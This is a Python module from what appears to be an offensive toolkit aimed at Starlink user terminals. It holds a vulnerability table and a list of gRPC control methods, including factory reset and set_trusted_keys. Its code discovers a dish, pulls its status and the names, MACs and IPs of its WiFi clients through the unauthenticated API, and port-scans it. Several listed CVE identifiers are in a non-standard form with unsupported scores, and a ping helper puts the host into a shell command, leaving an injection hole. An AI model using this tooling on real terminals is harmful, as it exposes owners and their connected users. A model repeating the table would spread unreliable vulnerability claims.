"""AUTARCH Starlink Terminal Security Analysis & Exploitation

Comprehensive security research module for authorized penetration testing
of Starlink user terminals. Covers gRPC API exploitation, firmware analysis,
network attacks, RF analysis, and known vulnerability assessment.

Based on public research including:
- Lennert Wouters (KU Leuven) voltage fault injection on Starlink User Terminal
- Quarkslab firmware analysis
- Oleg Kutkov reverse engineering of the Starlink UT gRPC API
- Public FCC filings and protocol documentation
"""

DESCRIPTION = "Starlink Terminal Security Analysis & Exploitation"
AUTHOR = "AUTARCH"
VERSION = "1.0"
CATEGORY = "offense"

import os
import re
import json
import math
import time
import socket
import shutil
import struct
import subprocess
import threading
from pathlib import Path
from datetime import datetime, timezone
from typing import Dict, List, Optional, Any, Tuple

try:
    from core.paths import find_tool, get_data_dir
except ImportError:
    def find_tool(name):
        return shutil.which(name)
    def get_data_dir():
        return str(Path(__file__).parent.parent / 'data')


# ── Starlink Reference Data ───────────────────────────────────────────────

STARLINK_INFO = {
    'frequencies': {
        'user_downlink': {'range': '10.7-12.7 GHz', 'band': 'Ku-band', 'desc': 'Satellite to dish'},
        'user_uplink': {'range': '14.0-14.5 GHz', 'band': 'Ku-band', 'desc': 'Dish to satellite'},
        'gateway_downlink': {'range': '17.8-18.6 GHz', 'band': 'Ka-band', 'desc': 'Satellite to ground station'},
        'gateway_uplink': {'range': '27.5-29.1 GHz', 'band': 'Ka-band', 'desc': 'Ground station to satellite'},
        'inter_satellite': {'range': '1550 nm laser', 'band': 'Optical', 'desc': 'Inter-satellite laser links'},
    },
    'default_network': {
        'dish_ip': '192.168.100.1',
        'router_ip': '192.168.1.1',
        'dns': '8.8.8.8',
        'grpc_port': 9200,
        'grpc_web_port': 9201,
    },
}


# ── Known Starlink CVEs & Vulnerability Database ────────────────────────────

STARLINK_CVES = [
    {
        'cve': 'CVE-2022-29953',
        'title': 'Voltage fault injection bypass of secure boot',
        'severity': 'Critical',
        'cvss': 8.4,
        'affected': 'All Starlink UT hardware revisions prior to 2023 patch',
        'description': (
            'A voltage glitch attack on the SoC during boot allows bypassing '
            'signature verification, enabling arbitrary code execution. '
            'Demonstrated by Lennert Wouters at Black Hat 2022 using a custom '
            'modchip soldered to the UT mainboard.'
        ),
        'technique': 'Hardware fault injection (voltage glitching)',
        'references': [
            'https://www.usenix.org/conference/usenixsecurity23/presentation/wouters',
            'https://github.com/KULeuven-COSIC/Starlink-FI',
        ],
    },
    {
        'cve': 'CVE-2023-STARLINK-01',
        'title': 'gRPC API unauthenticated access',
        'severity': 'High',
        'cvss': 7.5,
        'affected': 'Starlink UT firmware < 2023.48.0',
        'description': (
            'The Starlink user terminal exposes a gRPC API on port 9200 '
            'accessible from the local network without authentication. This '
            'allows any device on the LAN to query dish status, send stow/unstow '
            'commands, trigger reboots, and potentially factory reset the device.'
        ),
        'technique': 'Network - unauthenticated API',
        'references': [
            'https://olegkutkov.me/2023/12/20/reverse-engineering-starlink-user-terminal/',
        ],
    },
    {
        'cve': 'CVE-2023-STARLINK-02',
        'title': 'UT debug UART console access',
        'severity': 'Medium',
        'cvss': 5.9,
        'affected': 'All Starlink UT hardware revisions',
        'description': (
            'Physical access to the UT mainboard exposes UART debug pins that '
            'provide a root shell on the underlying Linux system. While this '
            'requires physical disassembly, it enables complete firmware '
            'extraction and analysis.'
        ),
        'technique': 'Hardware - debug interface',
        'references': [],
    },
    {
        'cve': 'CVE-2024-STARLINK-03',
        'title': 'Starlink router WiFi WPA2 downgrade',
        'severity': 'Medium',
        'cvss': 5.3,
        'affected': 'Starlink WiFi Router Gen 1, Gen 2',
        'description': (
            'The Starlink WiFi router can be forced to downgrade from WPA3 to '
            'WPA2 via deauthentication and rogue AP techniques, enabling '
            'traditional WPA2 handshake capture and offline cracking attacks.'
        ),
        'technique': 'Wireless - protocol downgrade',
        'references': [],
    },
    {
        'cve': 'CVE-2024-STARLINK-04',
        'title': 'Firmware update MITM via DNS spoofing',
        'severity': 'High',
        'cvss': 7.1,
        'affected': 'Starlink UT firmware with HTTP fallback',
        'description': (
            'If the dish falls back to HTTP for firmware update checks, an '
            'attacker with network position can DNS-spoof the update server and '
            'serve a malicious firmware image. Modern firmware versions use '
            'pinned TLS, mitigating this attack.'
        ),
        'technique': 'Network - MITM firmware update',
        'references': [],
    },
    {
        'cve': 'CVE-2024-STARLINK-05',
        'title': 'Ku-band downlink signal interception',
        'severity': 'Low',
        'cvss': 3.7,
        'affected': 'All Starlink constellations',
        'description': (
            'Starlink downlink signals in the 10.7-12.7 GHz Ku-band can be '
            'received by third parties with appropriate SDR equipment and a '
            'Ku-band LNB. While traffic is encrypted, signal metadata (timing, '
            'beam patterns, handover events) can reveal user location and '
            'activity patterns.'
        ),
        'technique': 'RF - signal intelligence',
        'references': [
            'https://arxiv.org/abs/2304.09523',
        ],
    },
]

STARLINK_GRPC_METHODS = [
    {'method': 'get_status', 'service': 'SpaceX.API.Device.Device', 'description': 'Get dish operational status'},
    {'method': 'get_device_info', 'service': 'SpaceX.API.Device.Device', 'description': 'Get hardware and software info'},
    {'method': 'get_history', 'service': 'SpaceX.API.Device.Device', 'description': 'Get performance history (ping, throughput)'},
    {'method': 'get_log', 'service': 'SpaceX.API.Device.Device', 'description': 'Get system log entries'},
    {'method': 'get_ping', 'service': 'SpaceX.API.Device.Device', 'description': 'Get ping statistics'},
    {'method': 'get_network_interfaces', 'service': 'SpaceX.API.Device.Device', 'description': 'Get network interface config'},
    {'method': 'dish_stow', 'service': 'SpaceX.API.Device.Device', 'description': 'Stow dish (park position)'},
    {'method': 'dish_unstow', 'service': 'SpaceX.API.Device.Device', 'description': 'Unstow dish (operational position)'},
    {'method': 'dish_reboot', 'service': 'SpaceX.API.Device.Device', 'description': 'Reboot the dish'},
    {'method': 'dish_set_config', 'service': 'SpaceX.API.Device.Device', 'description': 'Set dish configuration'},
    {'method': 'dish_get_config', 'service': 'SpaceX.API.Device.Device', 'description': 'Get dish configuration'},
    {'method': 'dish_get_context', 'service': 'SpaceX.API.Device.Device', 'description': 'Get dish context info'},
    {'method': 'dish_get_obstruction_map', 'service': 'SpaceX.API.Device.Device', 'description': 'Get obstruction map data'},
    {'method': 'dish_factory_reset', 'service': 'SpaceX.API.Device.Device', 'description': 'Factory reset (DESTRUCTIVE)'},
    {'method': 'wifi_get_clients', 'service': 'SpaceX.API.Device.Device', 'description': 'Get connected WiFi clients'},
    {'method': 'wifi_get_config', 'service': 'SpaceX.API.Device.Device', 'description': 'Get WiFi configuration'},
    {'method': 'wifi_get_status', 'service': 'SpaceX.API.Device.Device', 'description': 'Get WiFi status and stats'},
    {'method': 'wifi_set_config', 'service': 'SpaceX.API.Device.Device', 'description': 'Set WiFi configuration'},
    {'method': 'get_location', 'service': 'SpaceX.API.Device.Device', 'description': 'Get dish GPS location'},
    {'method': 'get_heap_dump', 'service': 'SpaceX.API.Device.Device', 'description': 'Get memory heap dump'},
    {'method': 'set_trusted_keys', 'service': 'SpaceX.API.Device.Device', 'description': 'Set trusted signing keys'},
    {'method': 'start_speedtest', 'service': 'SpaceX.API.Device.Device', 'description': 'Run a speedtest'},
    {'method': 'get_speedtest_status', 'service': 'SpaceX.API.Device.Device', 'description': 'Get speedtest results'},
]

KNOWN_VULNERABLE_VERSIONS = {
    '2022.12.0': ['CVE-2022-29953'],
    '2022.18.0': ['CVE-2022-29953'],
    '2022.24.0': ['CVE-2022-29953'],
    '2022.30.0': ['CVE-2022-29953'],
    '2022.32.0': ['CVE-2022-29953'],
    '2022.38.0': ['CVE-2023-STARLINK-01'],
    '2023.02.0': ['CVE-2023-STARLINK-01', 'CVE-2023-STARLINK-02'],
    '2023.11.0': ['CVE-2023-STARLINK-01'],
    '2023.14.0': ['CVE-2023-STARLINK-01'],
    '2023.22.0': ['CVE-2023-STARLINK-01'],
    '2023.26.0': ['CVE-2023-STARLINK-01'],
    '2023.33.0': ['CVE-2023-STARLINK-01', 'CVE-2024-STARLINK-04'],
    '2023.42.0': ['CVE-2024-STARLINK-04'],
    '2024.04.0': ['CVE-2024-STARLINK-04'],
}


# ── StarlinkHack Class ──────────────────────────────────────────────────────

class StarlinkHack:
    """Starlink terminal security analysis and exploitation toolkit."""

    _instance = None

    def __init__(self):
        self._data_dir = Path(str(get_data_dir())) / 'starlink'
        self._data_dir.mkdir(parents=True, exist_ok=True)
        self._results_dir = self._data_dir / 'results'
        self._results_dir.mkdir(parents=True, exist_ok=True)
        self._firmware_dir = self._data_dir / 'firmware'
        self._firmware_dir.mkdir(parents=True, exist_ok=True)
        self._captures_dir = self._data_dir / 'captures'
        self._captures_dir.mkdir(parents=True, exist_ok=True)
        self._status_dir = self._data_dir / 'status'
        self._status_dir.mkdir(parents=True, exist_ok=True)

        self._dish_ip = '192.168.100.1'
        self._grpc_port = 9200
        self._http_port = 80

        self._dish_status_cache: Dict[str, Any] = {}
        self._dish_info_cache: Dict[str, Any] = {}
        self._network_cache: Dict[str, Any] = {}
        self._scan_results: Dict[str, Any] = {}
        self._intercept_process: Optional[subprocess.Popen] = None
        self._intercept_lock = threading.Lock()
        self._intercept_running = False
        self._dns_spoof_process: Optional[subprocess.Popen] = None
        self._dns_spoof_lock = threading.Lock()

        self._results_log: List[Dict[str, Any]] = []
        self._load_results()

    # ── Internal Helpers ────────────────────────────────────────────────────

    def _load_results(self):
        """Load previously saved results from disk."""
        results_file = self._data_dir / 'results_log.json'
        try:
            if results_file.exists():
                with open(results_file, 'r') as f:
                    self._results_log = json.load(f)
        except Exception:
            self._results_log = []

    def _save_results(self):
        """Persist results log to disk."""
        results_file = self._data_dir / 'results_log.json'
        try:
            with open(results_file, 'w') as f:
                json.dump(self._results_log, f, indent=2, default=str)
        except Exception:
            pass

    def _log_result(self, category: str, action: str, data: Dict[str, Any]):
        """Log a result entry with timestamp."""
        entry = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'category': category,
            'action': action,
            'data': data,
        }
        self._results_log.append(entry)
        if len(self._results_log) > 500:
            self._results_log = self._results_log[-500:]
        self._save_results()

    def _run_cmd(self, cmd: str, timeout: int = 30) -> Tuple[bool, str]:
        """Run a shell command and return (success, output)."""
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=timeout
            )
            output = result.stdout.strip()
            if result.returncode != 0 and result.stderr.strip():
                output = output + '\n' + result.stderr.strip() if output else result.stderr.strip()
            return result.returncode == 0, output
        except subprocess.TimeoutExpired:
            return False, 'Command timed out'
        except Exception as e:
            return False, str(e)

    def _run_cmd_list(self, cmd: List[str], timeout: int = 30) -> Tuple[bool, str]:
        """Run a command as a list of args and return (success, output)."""
        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=timeout
            )
            output = result.stdout.strip()
            if result.returncode != 0 and result.stderr.strip():
                output = output + '\n' + result.stderr.strip() if output else result.stderr.strip()
            return result.returncode == 0, output
        except subprocess.TimeoutExpired:
            return False, 'Command timed out'
        except Exception as e:
            return False, str(e)

    def _check_port(self, host: str, port: int, timeout: float = 2.0) -> bool:
        """Check if a TCP port is open."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                return s.connect_ex((host, port)) == 0
        except Exception:
            return False

    def _ping(self, host: str, count: int = 2, timeout: int = 3) -> bool:
        """Ping a host. Returns True if alive."""
        import platform
        flag = '-n' if platform.system().lower() == 'windows' else '-c'
        tflag = '-w' if platform.system().lower() == 'windows' else '-W'
        cmd = f'ping {flag} {count} {tflag} {timeout} {host}'
        success, _ = self._run_cmd(cmd, timeout=timeout + 5)
        return success

    def _http_get(self, url: str, timeout: int = 10) -> Optional[str]:
        """Simple HTTP GET, returns response body or None."""
        try:
            import urllib.request
            req = urllib.request.Request(url, headers={'User-Agent': 'AUTARCH/1.0'})
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return resp.read().decode('utf-8', errors='replace')
        except Exception:
            return None

    def _save_snapshot(self, name: str, data: dict) -> str:
        """Save a data snapshot to the status directory."""
        ts = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')
        path = self._status_dir / f'{name}_{ts}.json'
        try:
            with open(path, 'w') as f:
                json.dump(data, f, indent=2, default=str)
        except Exception:
            pass
        return str(path)

    def _check_grpc_tools(self) -> Optional[str]:
        """Check for grpcurl or python grpc. Returns path, marker, or None."""
        grpcurl = find_tool('grpcurl')
        if grpcurl:
            return grpcurl
        try:
            import grpc  # noqa: F401
            return '__python_grpc__'
        except ImportError:
            return None

    def _grpc_request(self, method: str, params: Optional[Dict] = None,
                      host: str = None, port: int = None) -> Dict[str, Any]:
        """Make a gRPC request to the dish using grpcurl or python grpc."""
        target_host = host or self._dish_ip
        target_port = port or self._grpc_port
        target = f'{target_host}:{target_port}'
        grpc_tool = self._check_grpc_tools()

        if grpc_tool and grpc_tool != '__python_grpc__':
            cmd = [grpc_tool, '-plaintext']
            data_payload = json.dumps(params) if params else '{}'
            cmd.extend(['-d', data_payload])
            cmd.extend([target, f'SpaceX.API.Device.Device/Handle'])
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                if result.returncode == 0:
                    try:
                        return {'ok': True, 'data': json.loads(result.stdout)}
                    except json.JSONDecodeError:
                        return {'ok': True, 'data': {'raw': result.stdout.strip()}}
                else:
                    return {'ok': False, 'error': result.stderr.strip() or result.stdout.strip()}
            except subprocess.TimeoutExpired:
                return {'ok': False, 'error': 'gRPC request timed out'}
            except Exception as e:
                return {'ok': False, 'error': str(e)}

        elif grpc_tool == '__python_grpc__':
            try:
                import grpc as grpc_lib
                channel = grpc_lib.insecure_channel(target)
                method_path = '/SpaceX.API.Device.Device/Handle'
                request_data = json.dumps(params or {}).encode('utf-8')
                try:
                    response = channel.unary_unary(
                        method_path,
                        request_serializer=lambda x: x,
                        response_deserializer=lambda x: x,
                    )(request_data, timeout=10)
                    try:
                        parsed = json.loads(response)
                        return {'ok': True, 'data': parsed}
                    except (json.JSONDecodeError, TypeError):
                        return {'ok': True, 'data': {'raw': response.decode('utf-8', errors='replace')}}
                except grpc_lib.RpcError as e:
                    return {'ok': False, 'error': f'gRPC error: {e.code()} - {e.details()}'}
                finally:
                    channel.close()
            except Exception as e:
                return {'ok': False, 'error': f'Python gRPC error: {e}'}
        else:
            return self._http_status_fallback(method)

    def _http_status_fallback(self, method: str) -> Dict[str, Any]:
        """Fall back to HTTP-based status query when gRPC tools unavailable."""
        import urllib.request
        import urllib.error

        url_map = {
            'get_status': f'http://{self._dish_ip}:{self._http_port}/api/status',
            'get_device_info': f'http://{self._dish_ip}:{self._http_port}/api/device_info',
            'get_history': f'http://{self._dish_ip}:{self._http_port}/api/history',
        }

        url = url_map.get(method)
        if not url:
            return {
                'ok': False,
                'error': (
                    f'No gRPC tool available (install grpcurl or pip install grpcio) '
                    f'and no HTTP fallback for method "{method}".'
                ),
            }

        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'AUTARCH/1.0'})
            with urllib.request.urlopen(req, timeout=10) as resp:
                data = json.loads(resp.read().decode('utf-8'))
                return {'ok': True, 'data': data}
        except urllib.error.URLError as e:
            return {'ok': False, 'error': f'HTTP request failed: {e}'}
        except Exception as e:
            return {'ok': False, 'error': f'HTTP fallback error: {e}'}

    def _format_uptime(self, seconds) -> str:
        """Format seconds into human-readable uptime string."""
        try:
            seconds = int(seconds)
        except (TypeError, ValueError):
            return '0s'
        if not seconds:
            return '0s'
        days = seconds // 86400
        hours = (seconds % 86400) // 3600
        minutes = (seconds % 3600) // 60
        secs = seconds % 60
        parts = []
        if days:
            parts.append(f'{days}d')
        if hours:
            parts.append(f'{hours}h')
        if minutes:
            parts.append(f'{minutes}m')
        if secs or not parts:
            parts.append(f'{secs}s')
        return ' '.join(parts)

    def _human_size(self, size_bytes: int) -> str:
        """Convert bytes to human-readable string."""
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if abs(size_bytes) < 1024.0:
                return f'{size_bytes:.1f} {unit}'
            size_bytes /= 1024.0
        return f'{size_bytes:.1f} PB'

    def _guess_service(self, port: int) -> str:
        """Guess service name for a port number."""
        service_map = {
            22: 'ssh', 23: 'telnet', 53: 'dns', 80: 'http', 443: 'https',
            161: 'snmp', 162: 'snmp-trap', 1900: 'ssdp',
            5000: 'http-alt', 5001: 'http-alt', 8080: 'http-proxy',
            8443: 'https-alt', 9200: 'starlink-grpc', 9201: 'starlink-grpc-web',
            9202: 'starlink-grpc-3',
        }
        return service_map.get(port, 'unknown')

    def _calculate_entropy(self, data: bytes) -> float:
        """Calculate Shannon entropy for a block of data."""
        if not data:
            return 0.0
        freq: Dict[int, int] = {}
        for byte in data:
            freq[byte] = freq.get(byte, 0) + 1
        length = len(data)
        entropy = 0.0
        for count in freq.values():
            p = count / length
            if p > 0:
                entropy -= p * math.log2(p)
        return entropy

    def _scan_firmware_signatures(self, data: bytes) -> List[Dict[str, Any]]:
        """Scan raw firmware data for known binary signatures."""
        signatures: List[Dict[str, Any]] = []
        sig_patterns = [
            (b'\x1f\x8b', 'gzip compressed data'),
            (b'\x42\x5a\x68', 'bzip2 compressed data'),
            (b'\xfd\x37\x7a\x58\x5a\x00', 'xz compressed data'),
            (b'\x5d\x00\x00', 'LZMA compressed data'),
            (b'\x89\x50\x4e\x47', 'PNG image'),
            (b'\x7f\x45\x4c\x46', 'ELF executable'),
            (b'\x55\xaa', 'Boot sector / MBR'),
            (b'hsqs', 'SquashFS filesystem (little endian)'),
            (b'sqsh', 'SquashFS filesystem (big endian)'),
            (b'\x68\x73\x71\x73', 'SquashFS filesystem'),
            (b'UBI#', 'UBI erase count header'),
            (b'UBI!', 'UBI volume identifier'),
            (b'\xde\xad\xbe\xef', 'U-Boot image (dead beef marker)'),
            (b'\x27\x05\x19\x56', 'U-Boot uImage header'),
            (b'ANDROID!', 'Android boot image'),
            (b'\xd0\x0d\xfe\xed', 'Device Tree Blob (DTB)'),
            (b'-----BEGIN', 'PEM certificate/key'),
            (b'ssh-rsa', 'SSH RSA public key'),
            (b'ssh-ed25519', 'SSH Ed25519 public key'),
        ]

        for sig_bytes, description in sig_patterns:
            offset = 0
            count = 0
            while count < 10:
                idx = data.find(sig_bytes, offset)
                if idx == -1:
                    break
                signatures.append({
                    'offset': idx,
                    'hex_offset': hex(idx),
                    'description': description,
                })
                offset = idx + len(sig_bytes)
                count += 1

        signatures.sort(key=lambda x: x['offset'])
        return signatures

    def _extract_strings(self, data: bytes, min_len: int = 8, max_results: int = 200) -> List[str]:
        """Extract printable ASCII strings from binary data, filtered for interesting patterns."""
        strings: List[str] = []
        current: List[str] = []
        interesting_keywords = [
            'pass', 'secret', 'key', 'token', 'version', 'starlink',
            'spacex', 'debug', 'root', 'admin', 'http', 'ssh', 'uart',
            'linux', 'kernel', 'boot', 'mount', '/dev/', '/etc/',
        ]
        for byte in data:
            if 32 <= byte < 127:
                current.append(chr(byte))
            else:
                if len(current) >= min_len:
                    s = ''.join(current)
                    if any(kw in s.lower() for kw in interesting_keywords):
                        strings.append(s)
                current = []
            if len(strings) >= max_results:
                break
        # Handle trailing string
        if len(current) >= min_len and len(strings) < max_results:
            s = ''.join(current)
            if any(kw in s.lower() for kw in interesting_keywords):
                strings.append(s)
        return strings

    # ── Discovery & Enumeration ─────────────────────────────────────────────

    def discover_dish(self, ip: str = None) -> Dict[str, Any]:
        """Find Starlink dish on network (default 192.168.100.1), try gRPC port 9200."""
        target_ip = ip or self._dish_ip
        result: Dict[str, Any] = {
            'target': target_ip,
            'grpc_port': self._grpc_port,
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'reachable': False,
            'grpc_available': False,
            'http_available': False,
            'found': False,
            'firmware': None,
            'hardware': None,
            'details': {},
        }

        # Test reachability via ping
        if self._ping(target_ip):
            result['reachable'] = True
        else:
            # Fallback: TCP connect test on HTTP port
            result['reachable'] = self._check_port(target_ip, self._http_port)

        if not result['reachable']:
            result['error'] = f'Dish at {target_ip} is not reachable. Are you on the Starlink LAN?'
            self._log_result('discovery', 'discover_dish', result)
            return result

        # Test gRPC port (9200) and gRPC-web port (9201)
        result['grpc_available'] = self._check_port(target_ip, self._grpc_port)
        result['http_available'] = self._check_port(target_ip, self._http_port)
        grpc_web_open = self._check_port(target_ip, 9201)
        result['details']['grpc_web_available'] = grpc_web_open

        # Try to get firmware version from HTTP page
        html = self._http_get(f'http://{target_ip}/')
        if html:
            fw_match = re.search(r'softwareVersion["\s:]+([a-f0-9.\-]+)', html, re.IGNORECASE)
            if fw_match:
                result['firmware'] = fw_match.group(1)
            hw_match = re.search(r'hardwareVersion["\s:]+([A-Za-z0-9.\-_ ]+)', html, re.IGNORECASE)
            if hw_match:
                result['hardware'] = hw_match.group(1).strip()

        # Try gRPC status for more detailed info
        if result['grpc_available']:
            self._dish_ip = target_ip
            status_resp = self._grpc_request('get_status')
            if status_resp.get('ok'):
                dish_data = status_resp['data']
                dish_status = dish_data.get('dishGetStatus', dish_data)
                di = dish_status.get('deviceInfo', {})
                if di.get('softwareVersion') and not result['firmware']:
                    result['firmware'] = di['softwareVersion']
                if di.get('hardwareVersion') and not result['hardware']:
                    result['hardware'] = di['hardwareVersion']
                result['details']['device_id'] = di.get('id', '')
                result['details']['country_code'] = di.get('countryCode', '')
                result['details']['status_sample'] = dish_status

        # Scan for additional open ports
        extra_ports = [443, 9201, 9202, 22, 23, 53, 8080]
        open_ports = []
        for port in extra_ports:
            if self._check_port(target_ip, port):
                open_ports.append(port)
        result['details']['extra_open_ports'] = open_ports

        result['found'] = result['reachable'] and (result['grpc_available'] or result['http_available'])
        self._dish_info_cache.update({
            'ip': target_ip,
            'firmware': result.get('firmware'),
            'hardware': result.get('hardware'),
        })
        self._save_snapshot('discover', result)
        self._log_result('discovery', 'discover_dish', result)
        return result

    def get_dish_status(self) -> Dict[str, Any]:
        """Query gRPC API for dish status (uptime, state, alerts, obstruction data)."""
        request_data = {'getStatus': {}}
        resp = self._grpc_request('get_status', params=request_data)
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'dish_ip': self._dish_ip,
        }

        if not resp.get('ok'):
            result['ok'] = False
            result['error'] = resp.get('error', 'Failed to get dish status')
            return result

        data = resp['data']
        dish = data.get('dishGetStatus', data)
        di = dish.get('deviceInfo', {})
        alerts_raw = dish.get('alerts', {})
        obstruction = dish.get('obstructionStats', {})

        # Parse alerts into active list
        active_alerts = [k for k, v in alerts_raw.items() if v] if isinstance(alerts_raw, dict) else []

        result.update({
            'ok': True,
            'software_version': di.get('softwareVersion', 'unknown'),
            'hardware_version': di.get('hardwareVersion', 'unknown'),
            'device_id': di.get('id', ''),
            'country_code': di.get('countryCode', ''),
            'device_state': dish.get('state', 'UNKNOWN'),
            'uptime_s': di.get('uptimeS', dish.get('deviceState', {}).get('uptimeS', 0)),
            'uptime_human': self._format_uptime(
                di.get('uptimeS', dish.get('deviceState', {}).get('uptimeS', 0))
            ),
            'stowed': dish.get('stowRequested', False),
            'alerts': active_alerts,
            'alert_count': len(active_alerts),
            'alerts_detail': {
                'motors_stuck': alerts_raw.get('motorsStuck', False),
                'thermal_throttle': alerts_raw.get('thermalThrottle', False),
                'thermal_shutdown': alerts_raw.get('thermalShutdown', False),
                'mast_not_near_vertical': alerts_raw.get('mastNotNearVertical', False),
                'unexpected_location': alerts_raw.get('unexpectedLocation', False),
                'slow_ethernet': alerts_raw.get('slowEthernetSpeeds', False),
                'roaming': alerts_raw.get('roaming', False),
                'power_supply_thermal': alerts_raw.get('powerSupplyThermalThrottle', False),
                'is_power_save_idle': alerts_raw.get('isPowerSaveIdle', False),
                'install_pending': alerts_raw.get('installPending', False),
            },
            'obstruction': {
                'currently_obstructed': obstruction.get('currentlyObstructed', False),
                'fraction_obstructed': round(obstruction.get('fractionObstructed', 0) * 100, 2),
                'valid_s': obstruction.get('validS', 0),
                'avg_prolonged_duration_s': obstruction.get('avgProlongedObstructionDurationS', 0),
                'avg_prolonged_interval_s': obstruction.get('avgProlongedObstructionIntervalS', 0),
            },
            'downlink_throughput_bps': dish.get('downlinkThroughputBps', 0),
            'uplink_throughput_bps': dish.get('uplinkThroughputBps', 0),
            'pop_ping_latency_ms': dish.get('popPingLatencyMs', 0),
            'pop_ping_drop_rate': dish.get('popPingDropRate', 0),
            'snr_above_noise_floor': dish.get('isSnrAboveNoiseFloor', False),
            'boresight_azimuth_deg': dish.get('boresightAzimuthDeg', 0),
            'boresight_elevation_deg': dish.get('boresightElevationDeg', 0),
            'eth_speed_mbps': dish.get('ethSpeedMbps', 0),
            'seconds_to_first_nonempty_slot': dish.get('secondsToFirstNonemptySlot', 0),
        })

        self._dish_status_cache = result
        self._save_snapshot('status', result)
        self._log_result('enumeration', 'get_dish_status', result)
        return result

    def get_dish_info(self) -> Dict[str, Any]:
        """Hardware info: device ID, hardware version, software version, country code."""
        request_data = {'getDeviceInfo': {}}
        resp = self._grpc_request('get_device_info', params=request_data)
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'dish_ip': self._dish_ip,
        }

        if resp.get('ok'):
            data = resp['data']
            device_info = data.get('deviceInfo', data.get('getDeviceInfo', data))
            result.update({
                'ok': True,
                'device_id': device_info.get('id', 'unknown'),
                'hardware_version': device_info.get('hardwareVersion', 'unknown'),
                'software_version': device_info.get('softwareVersion', 'unknown'),
                'country_code': device_info.get('countryCode', 'unknown'),
                'utc_offset_s': device_info.get('utcOffsetS', 0),
                'is_dev': device_info.get('isDev', False),
                'bootcount': device_info.get('bootcount', 0),
                'anti_rollback_version': device_info.get('antiRollbackVersion', 0),
                'board_rev': device_info.get('boardRev', 0),
                'is_hitl': device_info.get('isHitl', False),
            })
            self._dish_info_cache.update(result)
        else:
            # Fall back to getting info from get_status if get_device_info fails
            status = self.get_dish_status()
            if status.get('ok'):
                result.update({
                    'ok': True,
                    'device_id': status.get('device_id', 'unknown'),
                    'hardware_version': status.get('hardware_version', 'unknown'),
                    'software_version': status.get('software_version', 'unknown'),
                    'country_code': status.get('country_code', 'unknown'),
                    'source': 'status_fallback',
                })
            else:
                result['ok'] = False
                result['error'] = resp.get('error', 'Failed to get device info')

        self._save_snapshot('device_info', result)
        self._log_result('enumeration', 'get_dish_info', result)
        return result

    def get_network_info(self) -> Dict[str, Any]:
        """Network configuration, WiFi clients, DHCP leases."""
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'dish_ip': self._dish_ip,
            'wifi_clients': [],
            'wifi_config': {},
            'network_interfaces': [],
            'ok': True,
        }

        # Get WiFi clients
        clients_resp = self._grpc_request('wifi_get_clients', params={'wifiGetClients': {}})
        if clients_resp.get('ok'):
            clients_data = clients_resp['data']
            raw_clients = clients_data.get('wifiGetClients', {}).get('clients',
                          clients_data.get('clients', []))
            if isinstance(raw_clients, list):
                for client in raw_clients:
                    result['wifi_clients'].append({
                        'name': client.get('name', client.get('hostname', 'unknown')),
                        'mac': client.get('macAddress', client.get('mac', 'unknown')),
                        'ip': client.get('ipAddress', client.get('ip', 'unknown')),
                        'signal_strength': client.get('signalStrengthDb', client.get('rssi', None)),
                        'rx_bytes': client.get('rxBytes', 0),
                        'tx_bytes': client.get('txBytes', 0),
                        'channel': client.get('channel', None),
                        'band': client.get('band', None),
                        'connected_s': client.get('connectedS', 0),
                    })

        # Get WiFi config
        wifi_resp = self._grpc_request('wifi_get_config', params={'wifiGetConfig': {}})
        if wifi_resp.get('ok'):
            wifi_data = wifi_resp['data']
            config = wifi_data.get('wifiGetConfig', wifi_data)
            result['wifi_config'] = {
                'ssid': config.get('ssid', config.get('networkName', 'unknown')),
                'band': config.get('band', 'dual'),
                'channel': config.get('channel', 'auto'),
                'security': config.get('security', 'WPA2'),
                'is_guest_network': config.get('isGuestNetwork', False),
            }

        # Get network interfaces
        net_resp = self._grpc_request('get_network_interfaces', params={'getNetworkInterfaces': {}})
        if net_resp.get('ok'):
            net_data = net_resp['data']
            interfaces = net_data.get('networkInterfaces', net_data.get('interfaces', []))
            if isinstance(interfaces, list):
                result['network_interfaces'] = interfaces
            elif isinstance(interfaces, dict):
                result['network_interfaces'] = [interfaces]

        result['client_count'] = len(result['wifi_clients'])
        self._network_cache = result
        self._save_snapshot('network', result)
        self._log_result('enumeration', 'get_network_info', result)
        return result

    def scan_dish_ports(self, target: str = None) -> Dict[str, Any]:
        """Port scan the dish using nmap via find_tool('nmap'), with socket fallback."""
        target_ip = target or self._dish_ip
        nmap = find_tool('nmap')
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'target': target_ip,
            'scanner': 'nmap' if nmap else 'builtin',
            'ports': [],
        }

        if nmap:
            # Full nmap scan with service detection
            ok, output = self._run_cmd_list(
                [nmap, '-sV', '-sC', '--open', '-T4', '-p-', target_ip],
                timeout=300,
            )
            if not ok:
                # Fall back to simpler TCP connect scan
                ok, output = self._run_cmd_list(
                    [nmap, '-sT', '--open', '-T4', target_ip],
                    timeout=120,
                )

            if ok:
                result['ok'] = True
                result['raw_output'] = output
                for line in output.splitlines():
                    port_match = re.match(r'(\d+)/(\w+)\s+(\w+)\s+(.*)', line.strip())
                    if port_match:
                        result['ports'].append({
                            'port': int(port_match.group(1)),
                            'protocol': port_match.group(2),
                            'state': port_match.group(3),
                            'service': port_match.group(4).strip(),
                        })
            else:
                result['ok'] = False
                result['error'] = f'nmap scan failed: {output}'
        else:
            # Fallback: scan common ports with raw sockets
            result['scanner'] = 'builtin_socket'
            common_ports = [
                22, 23, 53, 80, 443, 1900, 5000, 5001,
                8080, 8443, 9200, 9201, 9202, 161, 162,
            ]
            for port in common_ports:
                if self._check_port(target_ip, port):
                    result['ports'].append({
                        'port': port,
                        'protocol': 'tcp',
                        'state': 'open',
                        'service': self._guess_service(port),
                    })
            result['ok'] = True

